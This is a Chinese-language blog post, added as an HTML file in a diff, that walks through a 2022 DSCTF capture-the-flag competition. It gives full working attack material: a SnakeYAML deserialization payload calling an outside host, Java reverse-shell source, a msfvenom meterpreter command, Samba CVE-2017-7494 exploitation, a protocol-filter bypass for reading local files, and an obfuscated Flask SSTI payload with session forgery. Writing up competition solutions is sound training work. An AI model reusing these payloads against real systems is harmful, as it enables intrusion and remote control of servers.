@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/2022-DSCTF/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/2022-DSCTF/","path":"2023/12/25/2022-DSCTF/","title":"2022 DSCTF首届数字空间安全攻防大赛"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2022 DSCTF首届数字空间安全攻防大赛 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-yaml"><span class="nav-text">easy_yaml</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-tou"><span class="nav-text">easy_tou</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pingpngping"><span class="nav-text">Pingpngping</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D"><span class="nav-text">反思</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/2022-DSCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2022 DSCTF首届数字空间安全攻防大赛 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022 DSCTF首届数字空间安全攻防大赛
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220717032916350.png" alt="image-20220717032916350"></p>
+<p>师傅们带的起飞，弱鸡web狗在线卑微 :(</p>
+<a id="more"></a>
+
+<h1 id="easy-yaml"><a href="#easy-yaml" class="headerlink" title="easy_yaml"></a>easy_yaml</h1><p>访问html给了源码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">shiroFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean bean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line">        bean.setSecurityManager((org.apache.shiro.mgt.SecurityManager) securityManager());</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; filterMap = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">        filterMap.put(<span class="string">&quot;/static/*&quot;</span>,<span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        filterMap.put(<span class="string">&quot;/load/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(filterMap);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/load/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">loadyaml</span><span class="params">(<span class="meta">@PathVariable(name = &quot;id&quot;)</span> String id, <span class="meta">@RequestParam(name = &quot;persondata&quot;, defaultValue = &quot;&quot;)</span> String persondata)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        Person p = yaml.loadAs(persondata, Person.class);</span><br><span class="line">        <span class="keyword">return</span> p.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Address</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String street;</span><br><span class="line">    <span class="keyword">public</span> Object ext;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> isValid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String username;</span><br><span class="line">    <span class="keyword">public</span> String age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> isLogin;</span><br><span class="line">    <span class="keyword">public</span> Address address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>存在一个yaml的反序列化点，先构造探测出网否。还有一个shiro的权限绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.105.38.203:30113&#x2F;load&#x2F;%3badmin</span><br><span class="line">POST:</span><br><span class="line">persondata&#x3D;username: Chris</span><br><span class="line">address:</span><br><span class="line">    ext: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http:&#x2F;&#x2F;150.158.181.145:3000&quot;]]]]</span><br></pre></td></tr></table></figure>
+
+<p>出网</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220715154539946.png" alt="image-20220715154539946"></p>
+<p>下载yaml反序列化exp：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<p>直接构造poc，利用socket反弹shell：<a target="_blank" rel="noopener" href="https://blog.spoock.com/2018/11/07/java-reverse-shell/">使用Java反弹shell | Spoock</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package artsploit;</span><br><span class="line"></span><br><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;</span><br><span class="line"></span><br><span class="line">    public AwesomeScriptEngineFactory() throws Exception&#123;</span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            String host&#x3D;&quot;xxx.xxx&quot;;  &#x2F;&#x2F;vps ip</span><br><span class="line">            int port&#x3D;3000;  &#x2F;&#x2F;vps port</span><br><span class="line">            String cmd&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;;</span><br><span class="line">            Process p&#x3D;new ProcessBuilder(cmd).redirectErrorStream(true).start();</span><br><span class="line">            java.net.Socket s&#x3D;new java.net.Socket(host,port);</span><br><span class="line">            java.io.InputStream pi&#x3D;p.getInputStream(),pe&#x3D;p.getErrorStream(),si&#x3D;s.getInputStream();</span><br><span class="line">            java.io.OutputStream po&#x3D;p.getOutputStream(),so&#x3D;s.getOutputStream();</span><br><span class="line">            while(!s.isClosed()) &#123;</span><br><span class="line">                while(pi.available()&gt;0) &#123;</span><br><span class="line">                    so.write(pi.read());</span><br><span class="line">                &#125;</span><br><span class="line">                while(pe.available()&gt;0) &#123;</span><br><span class="line">                    so.write(pe.read());</span><br><span class="line">                &#125;</span><br><span class="line">                while(si.available()&gt;0) &#123;</span><br><span class="line">                    po.write(si.read());</span><br><span class="line">                &#125;</span><br><span class="line">                so.flush();</span><br><span class="line">                po.flush();</span><br><span class="line">                Thread.sleep(50);</span><br><span class="line">                try &#123;</span><br><span class="line">                    p.exitValue();</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                catch (Exception e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            p.destroy();</span><br><span class="line">            s.close();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getExtensions() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getMimeTypes() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getNames() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object getParameter(String key) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getMethodCallSyntax(String obj, String m, String... args) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getOutputStatement(String toDisplay) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getProgram(String... statements) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ScriptEngine getScriptEngine() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译打包，放到服务器上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java   &#x2F;&#x2F;会生成一个AwesomeScriptEngineFactory.class文件</span><br><span class="line">jar -cvf yaml-payload.jar -C src&#x2F; .		&#x2F;&#x2F;将src目录下的文件打包为yaml-payload.jar的jar包</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220715160502638.png" alt="image-20220715160502638"></p>
+<p>FLAG：flag{0831778476e75b691c4396d1297e748e}</p>
+<h1 id="easy-tou"><a href="#easy-tou" class="headerlink" title="easy_tou"></a>easy_tou</h1><p>开局一个include，利用无临时文件进行getshell：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a>，文章写的是直接系统命令，为了方便先获取webshell，参见项目：<a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a>，把test.py中的base64改成一句话</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220715104322379.png" alt="image-20220715104322379"></p>
+<p>获得内核信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.93.179.206:30004&#x2F;?file&#x3D;&#x2F;proc&#x2F;version</span><br><span class="line"></span><br><span class="line">Linux version 5.4.0-113-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022</span><br></pre></td></tr></table></figure>
+
+<p>www权限，没有找到flag，尝试提权，suid和pkexec均失败。端口扫描居然开了445端口</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220716235105014.png" alt="image-20220716235105014"></p>
+<p>找到linux的445端口渗透文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/4thrun/p/15148613.html">CVE-2017-7494 Samba远程命令执行漏洞复现</a></p>
+<p>msf直接来个马，翻看/etc/hosts 发现路由为172.17.0.0/24，msf加上路由</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220717015438171.png" alt="image-20220717015438171"></p>
+<p>这里切换target为command，然后发送的paylaod为python的反弹shell。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220717020119379.png" alt="image-20220717020119379"></p>
+<p>run一下，收到root权限</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220717020235080.png" alt="image-20220717020235080"></p>
+<p>但是没法读文件，再生成个马，root执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;ip LPORT&#x3D;6666 -f elf &gt; root.elf</span><br></pre></td></tr></table></figure>
+
+<p>handler监听，收到shell，dir/cat一下就行了。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220717021955463.png" alt="image-20220717021955463"></p>
+<h1 id="Pingpngping"><a href="#Pingpngping" class="headerlink" title="Pingpngping"></a>Pingpngping</h1><p>admin/admin登录，flask2.1.2 python3.8</p>
+<p>给了一段代码，一看麻了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="built_in">str</span>(request.form.get(<span class="string">&#x27;url&#x27;</span>)).lower()</span><br><span class="line">urlarr = urlparse(url)</span><br><span class="line"><span class="keyword">for</span> black <span class="keyword">in</span> [<span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;gopher&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>]:</span><br><span class="line">    <span class="keyword">if</span> black <span class="keyword">in</span> urlarr[<span class="string">&#x27;scheme&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NoNoNO!!!You can&#x27;t use &#123;&#125; protocol&quot;</span>.<span class="built_in">format</span>(black)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;ping.html&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Request failed!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>username估摸能SSTI注入，fuzz麻了。题目通过session解密获得username并进行渲染，直接解session肯定需要 secret_key，如果知道key，就可以直接伪造cookie然后SSTI。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220715211401122.png" alt="image-20220715211401122"></p>
+<p>大量时间去写fuzz了username，卡死到这道题。</p>
+<p>WP：利用换行绕过了协议的限制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>尝试自己做一下,先读取app.py，知道key是命令行传入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SECRET_KEY&#x3D;str(sys.argv[1])</span><br></pre></td></tr></table></figure>
+
+<p>读取cmdline，获得key：Guess_fl4gName</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;self&#x2F;cmdline</span><br></pre></td></tr></table></figure>
+
+<p>然后伪造就行了，抄个payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% print(url_for[&quot;__glo&quot;&quot;bals__&quot;])[&quot;__g&quot;&quot;etitem__&quot;](&quot;o&quot;&quot;s&quot;)[&quot;p&quot;&quot;open&quot;](url_for[&quot;__glo&quot;&quot;bals__&quot;][&quot;requ&quot;&quot;est&quot;][&quot;args&quot;][&quot;g&quot;&quot;et&quot;](&quot;guoke&quot;))[&quot;re&quot;&quot;ad&quot;]() %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成session</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;Guess_fl4gName&quot;  -t &quot;&#123;&#39;username&#39;:&#39;&#123;% if(url_for[\&quot;__glo\&quot;\&quot;bals__\&quot;])[\&quot;__g\&quot;\&quot;etitem__\&quot;](\&quot;o\&quot;\&quot;s\&quot;)[\&quot;p\&quot;\&quot;open\&quot;](url_for[\&quot;__glo\&quot;\&quot;bals__\&quot;][\&quot;requ\&quot;\&quot;est\&quot;][\&quot;args\&quot;][\&quot;g\&quot;\&quot;et\&quot;](\&quot;guoke\&quot;))[\&quot;re\&quot;\&quot;ad\&quot;]() %&#125;&#123;% endif %&#125;&#39;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/2022dsctf/image-20220717031029178.png" alt="image-20220717031029178"></p>
+<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>easy_tou 在做题的时候用蚁剑的插件随后扫了一下端口，当时也没觉得445能有什么利用的，win的SMB倒是可以尝试利用17010，但是开在linux上真的挺容易忽略的，linux版的永恒之蓝，学到了。下回注意端口。</p>
+<p>ping那道纯粹因为讨厌SSTI，不想做，不过整体思路是有的，拿key-&gt;伪造session-&gt;SSTI-&gt;bypass。</p>
+<p>另外真心佩服guoke，唯一ak了web的男人。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                            </span><br><span class="line">                        &#96;:oDFo:&#96;                            </span><br><span class="line">                     .&#x2F;ymM0dayMmy&#x2F;.                          </span><br><span class="line">                  -+dHJ5aGFyZGVyIQ&#x3D;&#x3D;+-                    </span><br><span class="line">              &#96;:sm⏣~~Destroy.No.Data~~s:&#96;                </span><br><span class="line">           -+h2~~Maintain.No.Persistence~~h+-              </span><br><span class="line">       &#96;:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:&#96;          </span><br><span class="line">    .&#x2F;etc&#x2F;shadow.0days-Data&#39;%20OR%201&#x3D;1--.No.0MN8&#39;&#x2F;.      </span><br><span class="line"> -++SecKCoin++e.AMd&#96;       &#96;.-:&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;+hbove.913.ElsMNh+-    </span><br><span class="line">-~&#x2F;.ssh&#x2F;id_rsa.Des-                  &#96;htN01UserWroteMe!-  </span><br><span class="line">:dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  </span><br><span class="line">:we&#39;re.all.alike&#39;&#96;                     The.PFYroy.No.D7:  </span><br><span class="line">:PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    </span><br><span class="line">:msf&gt;exploit -j.                       :Ns.BOB&amp;ALICEes7:    </span><br><span class="line">:---srwxrwx:-.&#96;                        &#96;MS146.52.No.Per:    </span><br><span class="line">:&lt;script&gt;.Ac816&#x2F;                        sENbove3101.404:    </span><br><span class="line">:NT_AUTHORITY.Do                        &#96;T:&#x2F;shSYSTEM-.N:    </span><br><span class="line">:09.14.2011.raid                       &#x2F;STFU|wall.No.Pr:    </span><br><span class="line">:hevnsntSurb025N.                      dNVRGOING2GIVUUP:    </span><br><span class="line">:#OUTHOUSE-  -s:                       &#x2F;corykennedyData:    </span><br><span class="line">:$nmap -oS                              SSo.6178306Ence:    </span><br><span class="line">:Awsm.da:                            &#x2F;shMTl#beats3o.No.:    </span><br><span class="line">:Ring0:                             &#96;dDestRoyREXKC3ta&#x2F;M:    </span><br><span class="line">:23d:                               sSETEC.ASTRONOMYist:    </span><br><span class="line"> &#x2F;-                        &#x2F;yo-    .ence.N:()&#123; :|: &amp; &#125;;:    </span><br><span class="line">                           &#96;:Shall.We.Play.A.Game?tron&#x2F;    </span><br><span class="line">                           &#96;&#96;&#96;-ooy.if1ghtf0r+ehUser5&#96;    </span><br><span class="line">                         ..th3.H1V3.U2VjRFNN.jMh+.&#96;          </span><br><span class="line">                        &#96;MjM~~WE.ARE.se~~MMjMs              </span><br><span class="line">                         +~KANSAS.CITY&#39;s~-&#96;                  </span><br><span class="line">                          J~HAKCERS~.&#x2F;.&#96;                    </span><br><span class="line">                          .esc:wq!:&#96;                        </span><br><span class="line">                           +++ATH&#96;                            </span><br><span class="line">                            &#96;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/2022RCTF/" rel="next" title="2022RCTF">
+                  2022RCTF <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
